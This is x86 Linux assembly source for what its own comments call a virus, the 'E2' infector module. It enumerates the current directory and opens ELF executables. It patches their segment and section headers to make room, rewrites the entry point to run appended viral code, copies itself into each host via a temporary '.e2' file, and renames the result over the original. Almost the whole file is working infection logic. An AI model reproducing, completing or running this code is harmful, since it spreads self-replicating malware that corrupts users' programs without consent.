;============================================================
;i have really messed up this module but it was in a way good
;but the virus is very inefficient in terms of resources
;
;E2 thinks it will get the new_host as arg 1
;(read all instances of host in the E2 code as new_host)
;as long as stack structure is mainained before the control
;is passed from dir_scanner, everything is good
;also, ebp was never used in E2 and can be used to restore
;stack :)
;
;here is the stack state to be maintained
;
;                               .ebp
;--------------------------------
;| newhostnameptr | hostnameptr |
;--------------------------------
;^esp
;
;%ebx = (%esp)
;============================================================


	mov ebp,esp

	;%ebx=open(".","r")
	mov eax,5
	jmp __DIR__
  X__DIR__:
	pop ebx
	xor ecx,ecx
	xor edx,edx
	int 0x80
	mov ebx,eax

	;create space on stack
	;use higher 1200 bytes for getdents
	;and lower 800 bytes for strings
	sub esp,2000
	mov ecx,esp
	mov esi,esp
	mov edi,esp
	add edi,1200

	;getdents(%ebx,%esp,1200)
	mov eax,141
	mov edx,1200
	int 0x80

__readfnames:
	;process results
	mov eax,dword[esi]
	cmp eax,0
	je __ignoredent_ino
	movzx eax,word[esi+8]
	cmp eax,0
	je __lookforelf
	cmp eax,30
	jg __ignoredent_len
	mov ecx,dword[esi+10]
	cmp cl,0x2e
	je __ignoredent_hid
	mov dword[edi],ecx
	add edi,4
	mov ecx,dword[esi+14]
	mov dword[edi],ecx
	add edi,4
	mov ecx,dword[esi+18]
	mov dword[edi],ecx
	add edi,4
	mov ecx,dword[esi+22]
	mov dword[edi],ecx
	add edi,4
	mov ecx,dword[esi+26]
	mov dword[edi],ecx
	add edi,4
__ignoredent_len:
__ignoredent_hid:
	add esi,eax
	jmp __readfnames
__ignoredent_ino:
	movzx eax,word[esi+8]
	cmp eax,0
	je __lookforelf
	add esi,eax
	jmp __readfnames

__lookforelf:
	add esp,1200

	;close dir
	mov eax,6
	int 0x80

	;setup stack
	mov eax,dword[ebp+4]
	push eax
	mov ebp,esp
	add ebp,4
	mov ebx,ebp
	sub ebx,20
	push ebx

	jmp __infector_start

	;strings
  __DIR__:
	call X__DIR__
	db ".",0

__infector_start:
	;read hostnameptr to ebx
	mov ebx,dword[esp]
	add ebx,20
	mov dword[esp],ebx
	mov ecx,ebp
	add ecx,800
	cmp ecx,ebx
	je __exit_virus

	mov ecx,2
	mov edx,0
	mov eax,5
	int 0x80
;stack contains host fd
	push eax

;==========================================
;PASS ONE
;==========================================
;verifying elf
	mov ebx,eax
	mov eax,3
	push dword 0
	mov ecx,esp
	mov edx,4
	int 0x80
	pop ecx
	cmp ecx,0x464c457f
	jne __elf_fail
	mov eax,19
	mov ecx,16
	mov edx,0
	int 0x80
	mov eax,3
	push dword 0
	mov ecx,esp
	mov edx,2
	int 0x80
	pop ecx
	cmp ecx,2
	jne __elf_fail
;setting file offset to entrypoint location
	mov eax,19
	mov ecx,24
	mov edx,0
	int 0x80
;reading entry point addr to stack
	push dword 0
	mov ecx,esp
	mov eax,3
	mov edx,4
	int 0x80
;reading program header offset to stack
	mov eax,3
	push dword 0
	mov ecx,esp
	int 0x80

;setting file offset to phentsize location
	mov eax,19
	mov ecx,42
	mov edx,0
	int 0x80
;reading phentsize to stack as a dword
	mov eax,3
	mov edx,2
	push dword 0
	mov ecx,esp
	int 0x80
;reading phentnum to stack as a dword
	mov eax,3
	push dword 0
	mov ecx,esp
	int 0x80

;look for prog header with offset 0
;edi contains num of ph entries
	mov edi,[esp]
;esi contains ph entry size
	mov esi,[esp+4]
;esi contains offset
	sub esi,4
;offset to first header entry's poffset param
	mov eax,19
	mov edx,0
	mov ecx,[esp+8]
	add ecx,4
	int 0x80
;read poffset to stack
_readoffset:
	mov eax,3
	mov edx,4
	push dword 0
	mov ecx,esp
	int 0x80
;cmp poffset to 0
	pop eax
	cmp eax,0
;if 0 read psize to stack else update offset and read next entry
	je _readpsize
	dec edi
	cmp edi,0
;if 0 something wrong don't infect just exit else update offset
	je __exit_virus
	mov ecx,esi
	mov eax,19
	mov edx,1
	int 0x80
	jmp _readoffset
;offset to psize entry
_readpsize:
	mov eax,19
	mov edx,1
	mov ecx,8
	int 0x80
;read psize to stack
	mov eax,3
	mov edx,4
	push dword 0
	mov ecx,esp
	int 0x80

;update psize to psize+vsize
;reset offset
	mov eax,19
        mov edx,1
        mov ecx,-4
        int 0x80
;eax contains old psize
        mov eax,[esp]
;eax has new psize
        add eax,0xbb1	;TODO: Replace with VSIZE+6
;stack has new psize
        push eax
;write new psize
        mov eax,4
        mov edx,4
        mov ecx,esp
        int 0x80
	mov eax,4
	int 0x80
        pop eax

;update entry point to psize+pvaddr
;set file offset to pvaddr
	mov eax,19
	mov edx,1
	mov ecx,-16
	int 0x80
;read pvaddr to stack
	mov eax,3
	mov edx,4
	push dword 0
	mov ecx,esp
	int 0x80
;eax has pvaddr
	pop eax
;edx has psize
	mov edx,[esp]
	add eax,edx
;stack has new entrypoint addr
	push eax
;set offset to entrypoint
	mov eax,19
	mov edx,0
	mov ecx,24
	int 0x80
;write new entry point
	mov eax,4
	mov ecx,esp
	mov edx,4
	int 0x80
	pop eax
	
;first pass complete
;stack has the following structure:
;
;.ebp-32 .ebp-28    .ebp-24   .ebp-20 .ebp-16 .ebp-12  .ebp-8        .ebp-4        .ebp
;-----------------------------------------------------------------------------------
;| psize | phentnum | phentsz | phoff | entry | hostfd | hostnameptr | selfnameptr |
;-----------------------------------------------------------------------------------
;^esp    ^esp+4     ^esp+8    ^esp+12 ^esp+16 ^esp+20  ^esp+24       ^esp+28       ^esp+32
;
;===================================
;PASS TWO
;===================================
;every pheader with poffset > psize will have new offset = old offset + 0x1000
;update pheader poffset values
	mov edi,[esp+4]
	mov esi,[esp+8]
	sub esi,4
;offset to first pheader entry's poffset value
	mov eax,19
	mov edx,0
	mov ecx,[esp+12]
	add ecx,4
	int 0x80
;read offset value to stack
_readoffset2:
	mov eax,3
	mov edx,4
	push dword 0
	mov ecx,esp
	int 0x80
;cmp poffset to psize and if greater need to add a page size value
;eax has poffset
	pop eax
;edx has psize
	mov edx,[esp]
	cmp eax,edx
	jge _addpage
_updatefileoffset:
	dec edi
	cmp edi,0
	je _exitpasstwo
	mov ecx,esi
	mov eax,19
	mov edx,1
	int 0x80
	jmp _readoffset2
_addpage:
	add eax,0x1000
	push eax
;reset file offset
	mov eax,19
	mov edx,1
	mov ecx,-4
	int 0x80
;write new poffset
	mov eax,4
	mov edx,4
	mov ecx,esp
	int 0x80
	pop eax
	jmp _updatefileoffset

_exitpasstwo:
;eax has psize
	pop eax
	pop edx
	pop edx
	pop edx
;stack has psize
	push eax

;second pass complete
;stack has the following structure:
;
;.ebp-20 .ebp-16 .ebp-12  .ebp-8        .ebp-4        .ebp
;------------------------------------------------------
;| psize | entry | hostfd | hostnameptr | selfnameptr |
;------------------------------------------------------
;^esp    ^esp+4  ^esp+8   ^esp+12       ^esp+16       ^esp+20
;
;================================
;PASS THREE
;================================
;section headers with offset > psize will have new offset = old offset + 0x1000
;set file offset to shoff entry
	mov eax,19
	mov ecx,32
	mov edx,0
	int 0x80
;read shoff to stack
	mov eax,3
	mov edx,4
	push dword 0
	mov ecx,esp
	int 0x80
;if shoff > psize update shoff
;eax has shoff
	mov eax,[esp]
;edx has psize
	mov edx,[esp+4]
	cmp eax,edx
	jl _readshentsz
;eax has new shoff
	add eax,0x1000
;stack has new shoff
	push eax
;reset file offset
	mov eax,19
	mov edx,1
	mov ecx,-4
	int 0x80
;write new shoff
	mov eax,4
	mov edx,4
	mov ecx,esp
	int 0x80
	pop eax
_readshentsz:
;set file offset to shentsz
	mov eax,19
	mov edx,0
	mov ecx,46
	int 0x80
;read shentsz to stack as dword
	mov eax,3
	mov edx,2
	push dword 0
	mov ecx,esp
	int 0x80
;esi has shentsz
	pop esi
	sub esi,4
;read shentnum to stack as dword
	mov eax,3
	push dword 0
	int 0x80
;edi has shentnum
	pop edi

;read updated entry point to stack
	mov eax,19
	mov edx,0
	mov ecx,24
	int 0x80
	mov eax,3
	mov edx,4
	push dword 0
	mov ecx,esp
	int 0x80
;update shsize and shoffset values of each sheader
;set file offset to shoffset entry of first sheader
	mov eax,19
	mov ecx,[esp+4]
	add ecx,16
	mov edx,0
	int 0x80
;read offset value
_readoffset3:
	mov eax,3
	mov edx,4
	push dword 0
	mov ecx,esp
	int 0x80
;eax has shoffset
	pop eax
;edx has psize
	mov edx,[esp+8]
	cmp eax,edx
;if shoffset > psize add a page else check if the offset is to orig entry point and update code size
	jge _addpage3
;ecx has original entry point
	mov ecx,[esp+12]
;eax has pvaddr
	xor eax,ecx
;eax has value to new entry point
	add eax,edx
;edx has updated entry point
	mov edx,[esp]
	cmp eax,edx
	je _updateshsize
_updatefileoffset3:
	dec edi
	cmp edi,0
	je _exitpassthree
	mov eax,19
	mov edx,1
	mov ecx,esi
	int 0x80
	jmp _readoffset3

_addpage3:
;eax has updated shoffset
	add eax,0x1000
;stack has updated shoffset
	push eax
;reset file offset
	mov eax,19
	mov edx,1
	mov ecx,-4
	int 0x80
;write new shoffset
	mov eax,4
	mov edx,4
	mov ecx,esp
	int 0x80
	pop eax
	jmp _updatefileoffset3

_updateshsize:
;read shsize
	mov eax,3
	mov edx,4
	push dword 0
	mov ecx,esp
	int 0x80
;eax has old shsize
	pop eax
;eax has new shsize
	add eax,0xbb1	;TODO: Replace with VSIZE+6
;stack has new shsize
	push eax
;reset file offset
	mov eax,19
	mov edx,1
	mov ecx,-4
	int 0x80
;write new shsize
	mov eax,4
	mov edx,4
	mov ecx,esp
	int 0x80
	pop eax
;reset file offset
	mov eax,19
	mov edx,1
	mov ecx,-4
	int 0x80
	jmp _updatefileoffset3

_exitpassthree:
	pop eax
	pop eax

;third pass complete
;stack has the following structure:
;
;.ebp-20 .ebp-16 .ebp-12  .ebp-8        .ebp-4        .ebp
;------------------------------------------------------
;| psize | entry | hostfd | hostnameptr | selfnameptr |
;------------------------------------------------------
;^esp    ^esp+4  ^esp+8   ^esp+12       ^esp+16       ^esp+20
;
;==================================
;PASS FOUR
;==================================
;set offset in host file to beginning of file
	mov eax,19
	mov ecx,0
	mov edx,0
	int 0x80
;creating a .e2 file
	push dword 0x0032652e
	mov ebx,esp
	mov eax,5
	mov ecx,0x41
	mov edx,0x83ff
	int 0x80
	pop edx
;stack has fd to .e2
	push eax
;edi has psize
	mov edi,[esp+4]
	mov edx,512
	mov ecx,esp
	sub ecx,512
_copytilltext:
	cmp edi,512
	jl _lastroundcopytilltext
	sub edi,512
;read from host
	mov ebx,[esp+12]
	mov eax,3
	int 0x80
;write to .e2
	mov ebx,[esp]
	mov eax,4
	int 0x80
	jmp _copytilltext
_lastroundcopytilltext:
	mov eax,3
	mov edx,edi
	mov ebx,[esp+12]
	int 0x80
	mov eax,4
	mov ebx,[esp]
	int 0x80
;extend .e2 file by 4096 bytes full of \0
;-----------------------------------------
;PASS FOUR (SUB)
;-----------------------------------------
;stack state as follows
;
;.-24   .-20    .-16    .-12  .-8     .-4     .ebp
;----------------------------------------------
;| e2fd | psize | entry | hfd | hnptr | snptr |
;----------------------------------------------
;^esp   ^+4     ^+8     ^+12  ^+16    ^+20    ^+24
;
;read starting offset of virus in currently executing file
;same as reading host elf file (boring)
	mov ebx,[esp+20]
	mov eax,5
	xor ecx,ecx
	xor edx,edx
	int 0x80
	push eax

	mov ebx,eax
	mov ecx,24
	mov eax,19
	int 0x80
	mov eax,3
	mov edx,4
	push dword 0
	mov ecx,esp
	int 0x80
	mov eax,3
	push dword 0
	mov ecx,esp
	int 0x80

	mov ecx,42
	mov eax,19
	mov edx,0
	int 0x80
	mov eax,3
	mov edx,2
	push dword 0
	mov ecx,esp
	int 0x80
	mov eax,3
	push dword 0
	mov ecx,esp
	int 0x80
;--------------------------------------
;|phentnum|phentsz|phoff|sentry|sfd|...
;--------------------------------------
	pop edi
	pop esi
	sub esi,4

	mov eax,19
	mov edx,0
	pop ecx
	add ecx,4
	int 0x80

_readoffset4:
	mov eax,3
	mov edx,4
	push dword 0
	mov ecx,esp
	int 0x80
	pop eax
	cmp eax,0
	je _readvaddr4
	mov ecx,esi
	mov eax,19
	mov edx,1
	int 0x80
	jmp _readoffset4
_readvaddr4:
	mov eax,3
	push dword 0
	mov ecx,esp
	int 0x80

	pop eax
	pop ecx
	sub ecx,eax
	mov eax,19
	mov edx,0
	int 0x80
;-------------
;|sfd|e2fd|...
;-------------
;offset set, now write VSIZE number of bytes to .e2
	mov edi,0xbab	;TODO: Replace with VSIZE
	mov ecx,esp
	sub ecx,512
	mov edx,512
_copyviralbytes:
        cmp edi,512
        jl _lastroundcopyviralbytes
        sub edi,512
;read from self
        mov ebx,[esp]
        mov eax,3
        int 0x80
;write to .e2
        mov ebx,[esp+4]
        mov eax,4
        int 0x80
        jmp _copyviralbytes
_lastroundcopyviralbytes:
        mov eax,3
        mov edx,edi
        mov ebx,[esp]
        int 0x80
        mov eax,4
        mov ebx,[esp+4]
        int 0x80
;virus copied, close self
	pop ebx
	mov eax,6
	int 0x80
;stack restored
	mov ebx,[esp]
;jump code
;writing push
	mov ecx,esp
	sub ecx,1
	mov byte [ecx],0x68
	mov eax,4
	mov edx,1
	int 0x80
;writing orig entry point
	mov eax,4
	mov ecx,esp
	add ecx,8
	mov edx,4
	int 0x80
;writing ret
	mov ecx,esp
	sub ecx,1
	mov byte [ecx],0xc3
	mov eax,4
	mov edx,1
	int 0x80
;6 bytes of jump code done
	mov eax,93
	mov ecx,[esp+4]
	add ecx,0x1000
	int 0x80
;offset to eof
	mov eax,19
	mov edx,0
	int 0x80
;copy rest of the file till end
	mov ecx,esp
	sub ecx,512
	mov edx,512
_copytillend:
;read from host
	mov ebx,[esp+12]
	mov eax,3
	int 0x80
	cmp eax,512
	jne _lastroundcopytillend
	mov ebx,[esp]
	mov eax,4
	int 0x80
	jmp _copytillend
_lastroundcopytillend:
	mov ebx,[esp]
	mov edx,eax
	mov eax,4
	int 0x80
;close .e2
	mov eax,6
	int 0x80
;copy complete close host
        mov ebx,[esp+12]
        mov eax,6
        int 0x80
;rename .e2 to host
        mov ecx,[esp+16]
        push dword 0x0032652e
        mov ebx,esp
        mov eax,38
        int 0x80

__elf_fail:
	mov eax,6
	int 0x80

__restore_stack:
	mov esp,ebp
	sub esp,8
	jmp __infector_start

__exit_virus:
	nop
